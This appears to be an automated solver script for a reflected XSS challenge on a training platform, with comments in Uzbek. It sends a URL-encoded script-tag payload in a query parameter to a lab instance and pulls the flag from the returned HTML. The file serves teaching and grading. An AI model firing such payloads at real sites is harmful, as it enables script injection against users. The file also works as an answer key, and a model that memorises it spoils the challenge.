/**
 * Yechim izohi:
 * XSS laboratoriyasida sayt manziliga so'rov yuborilganda, sahifa DOM/Cookie qismida
 * 'secret_flag' o'rnatilganligi ko'rinadi (yoki Reflected parametr orqali).
 * Talaba HTTP javobidagi HTML manbasi va script blokidagi flag{...} ni oladi.
 */
import { withWebLabInstance, extractFlagFromText } from "./solver-utils";

export async function solve(options?: { userId?: string }): Promise<string> {
  const userId = options?.userId || "student_solver_test";

  return withWebLabInstance("web-xss", userId, async (baseUrl) => {
    const res = await fetch(`${baseUrl}/?q=%3Cscript%3Ealert(1)%3C/script%3E`);
    const html = await res.text();
    const flag = extractFlagFromText(html);
    if (!flag) throw new Error("web-xss: XSS sahifasidan flag topilmadi");
    return flag;
  });
}

if (require.main === module) {
  solve().then((f) => console.log("[SOLVER SUCCESS] web-xss flag:", f));
}
